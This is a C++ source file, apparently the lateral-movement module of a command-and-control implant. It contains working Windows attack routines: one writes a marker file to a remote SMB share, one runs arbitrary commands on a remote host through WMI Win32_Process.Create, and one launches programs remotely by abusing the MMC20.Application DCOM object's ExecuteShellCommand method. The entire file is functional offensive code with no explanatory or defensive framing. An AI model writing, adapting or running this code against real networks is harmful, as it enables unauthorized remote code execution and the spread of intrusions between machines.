#include "Lateral.h"

#include <windows.h>
#include <comdef.h>
#include <Wbemidl.h>

#include <string>
#include <string_view>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "wbemuuid.lib")

namespace lateral {

namespace {

std::wstring widen(std::string_view s) {
    if (s.empty()) return {};
    int n = MultiByteToWideChar(CP_UTF8, 0, s.data(), static_cast<int>(s.size()), nullptr, 0);
    std::wstring w(n, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, s.data(), static_cast<int>(s.size()), w.data(), n);
    return w;
}

std::string narrow(BSTR b) {
    if (!b) return {};
    int n = WideCharToMultiByte(CP_UTF8, 0, b, -1, nullptr, 0, nullptr, nullptr);
    if (n <= 1) return {};
    std::string s(static_cast<std::size_t>(n - 1), '\0');
    WideCharToMultiByte(CP_UTF8, 0, b, -1, s.data(), n, nullptr, nullptr);
    return s;
}

struct ComInit {
    HRESULT hr;
    ComInit() { hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED); }
    ~ComInit() { if (SUCCEEDED(hr)) CoUninitialize(); }
    bool ok() const { return SUCCEEDED(hr) || hr == S_FALSE || hr == RPC_E_CHANGED_MODE; }
};

} // namespace

std::string smb_check(std::string_view target, std::string_view share) {
    std::string path = "\\\\" + std::string(target) + "\\" + std::string(share);
    std::wstring w(path.begin(), path.end());
    HANDLE h = CreateFileW((w + L"\\c2_marker.txt").c_str(), GENERIC_WRITE, 0, nullptr,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) {
        return "error: " + std::to_string(GetLastError()) + " on " + path;
    }
    const char* msg = "c2 lateral test";
    DWORD wn = 0;
    WriteFile(h, msg, static_cast<DWORD>(strlen(msg)), &wn, nullptr);
    CloseHandle(h);
    return "ok: wrote marker to " + path;
}

std::string wmi_exec(std::string_view target, std::string_view command) {
    ComInit com;
    if (!com.ok()) return "error: CoInitializeEx";

    HRESULT hr = CoInitializeSecurity(
        nullptr, -1, nullptr, nullptr, RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE, nullptr);
    if (FAILED(hr) && hr != RPC_E_TOO_LATE) {
        // continue — often already initialized
    }

    IWbemLocator* loc = nullptr;
    hr = CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER,
                          IID_IWbemLocator, reinterpret_cast<void**>(&loc));
    if (FAILED(hr) || !loc) return "error: WbemLocator " + std::to_string(hr);

    std::wstring res = L"\\\\" + widen(target) + L"\\root\\cimv2";
    IWbemServices* svc = nullptr;
    hr = loc->ConnectServer(_bstr_t(res.c_str()), nullptr, nullptr, nullptr, 0,
                            nullptr, nullptr, &svc);
    if (FAILED(hr) || !svc) {
        loc->Release();
        return "error: ConnectServer " + std::to_string(hr);
    }

    hr = CoSetProxyBlanket(svc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr,
                           RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                           nullptr, EOAC_NONE);
    if (FAILED(hr)) {
        svc->Release(); loc->Release();
        return "error: CoSetProxyBlanket " + std::to_string(hr);
    }

    IWbemClassObject* cls = nullptr;
    hr = svc->GetObject(_bstr_t(L"Win32_Process"), 0, nullptr, &cls, nullptr);
    if (FAILED(hr) || !cls) {
        svc->Release(); loc->Release();
        return "error: GetObject Win32_Process " + std::to_string(hr);
    }

    IWbemClassObject* in_sig = nullptr;
    hr = cls->GetMethod(_bstr_t(L"Create"), 0, &in_sig, nullptr);
    if (FAILED(hr) || !in_sig) {
        cls->Release(); svc->Release(); loc->Release();
        return "error: GetMethod Create " + std::to_string(hr);
    }

    IWbemClassObject* in_inst = nullptr;
    hr = in_sig->SpawnInstance(0, &in_inst);
    if (FAILED(hr) || !in_inst) {
        in_sig->Release(); cls->Release(); svc->Release(); loc->Release();
        return "error: SpawnInstance " + std::to_string(hr);
    }

    VARIANT vcmd;
    VariantInit(&vcmd);
    vcmd.vt = VT_BSTR;
    vcmd.bstrVal = SysAllocString(widen(command).c_str());
    hr = in_inst->Put(L"CommandLine", 0, &vcmd, 0);
    VariantClear(&vcmd);
    if (FAILED(hr)) {
        in_inst->Release(); in_sig->Release(); cls->Release();
        svc->Release(); loc->Release();
        return "error: Put CommandLine " + std::to_string(hr);
    }

    IWbemClassObject* out_params = nullptr;
    hr = svc->ExecMethod(_bstr_t(L"Win32_Process"), _bstr_t(L"Create"), 0,
                         nullptr, in_inst, &out_params, nullptr);

    std::string result;
    if (FAILED(hr)) {
        result = "error: ExecMethod " + std::to_string(hr);
    } else if (out_params) {
        VARIANT vret, vpid;
        VariantInit(&vret); VariantInit(&vpid);
        out_params->Get(L"ReturnValue", 0, &vret, nullptr, nullptr);
        out_params->Get(L"ProcessId", 0, &vpid, nullptr, nullptr);
        long ret = (vret.vt == VT_I4) ? vret.lVal : -1;
        long pid = (vpid.vt == VT_I4) ? vpid.lVal : 0;
        VariantClear(&vret); VariantClear(&vpid);
        out_params->Release();
        if (ret == 0)
            result = "ok: wmi pid " + std::to_string(pid) + " on " + std::string(target);
        else
            result = "error: Win32_Process.Create returned " + std::to_string(ret);
    } else {
        result = "error: no out params";
    }

    in_inst->Release();
    in_sig->Release();
    cls->Release();
    svc->Release();
    loc->Release();
    return result;
}

std::string dcom_trigger(std::string_view target) {
    ComInit com;
    if (!com.ok()) return "error: CoInitializeEx";

    // CLSID_MMC20_Application {49B2791A-B1AE-4C90-9B8E-E860BA07F889}
    CLSID clsid{};
    HRESULT hr = CLSIDFromString(const_cast<LPOLESTR>(L"{49B2791A-B1AE-4C90-9B8E-E860BA07F889}"), &clsid);
    if (FAILED(hr)) return "error: CLSIDFromString";

    COSERVERINFO si{};
    std::wstring wtarget = widen(target);
    si.pwszName = wtarget.empty() ? nullptr : wtarget.data();

    MULTI_QI mqi{};
    mqi.pIID = &IID_IDispatch;
    hr = CoCreateInstanceEx(clsid, nullptr, CLSCTX_REMOTE_SERVER, &si, 1, &mqi);
    if (FAILED(hr) || FAILED(mqi.hr) || !mqi.pItf) {
        return "error: CoCreateInstanceEx " + std::to_string(hr) +
               " mqi=" + std::to_string(mqi.hr);
    }

    IDispatch* disp = reinterpret_cast<IDispatch*>(mqi.pItf);

    OLECHAR* name = const_cast<OLECHAR*>(L"ExecuteShellCommand");
    DISPID id = 0;
    hr = disp->GetIDsOfNames(IID_NULL, &name, 1, LOCALE_USER_DEFAULT, &id);
    if (FAILED(hr)) {
        disp->Release();
        return "error: GetIDsOfNames ExecuteShellCommand " + std::to_string(hr);
    }

    // ExecuteShellCommand(App, Dir, Param, Show) — IDispatch args are reverse order.
    VARIANT args[4];
    for (auto& a : args) VariantInit(&a);
    args[0].vt = VT_BSTR; args[0].bstrVal = SysAllocString(L"7");        // Show
    args[1].vt = VT_BSTR; args[1].bstrVal = SysAllocString(L"");         // Param
    args[2].vt = VT_BSTR; args[2].bstrVal = SysAllocString(L"C:\\");     // Dir
    args[3].vt = VT_BSTR; args[3].bstrVal = SysAllocString(L"calc.exe"); // App

    DISPPARAMS dp{};
    dp.cArgs = 4;
    dp.rgvarg = args;
    VARIANT result;
    VariantInit(&result);
    hr = disp->Invoke(id, IID_NULL, LOCALE_USER_DEFAULT, DISPATCH_METHOD, &dp,
                      &result, nullptr, nullptr);
    for (auto& a : args) VariantClear(&a);
    VariantClear(&result);
    disp->Release();

    if (FAILED(hr))
        return "error: Invoke ExecuteShellCommand " + std::to_string(hr);
    return "ok: dcom MMC20 ExecuteShellCommand on " + std::string(target);
}

} // namespace lateral
